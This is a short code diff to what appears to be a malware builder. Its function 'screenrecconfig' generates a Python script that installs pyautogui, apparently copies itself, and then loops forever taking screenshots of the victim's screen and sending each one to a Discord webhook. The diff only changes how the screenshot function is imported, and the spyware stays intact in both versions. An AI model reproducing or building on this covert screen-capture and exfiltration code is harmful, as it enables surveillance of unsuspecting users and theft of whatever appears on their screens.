@@ -364,7 +364,7 @@ def screenrecconfig():
     content = """import os
 from time import sleep
 try:
-    import pyautogui
+    from pyautogui import screenshot
     from dhooks import *
 except:
     os.system("pip install pyautogui")
@@ -381,7 +381,7 @@ if target != __file__:
 
 while True:
     fichier = f"C:/Users/{os.getenv('username')}/screen.png"
-    pyautogui.screenshot(fichier)
+    screenshot(fichier)
     webhook = Webhook(lien)
     file = File(fichier)
     webhook.send(file=file)
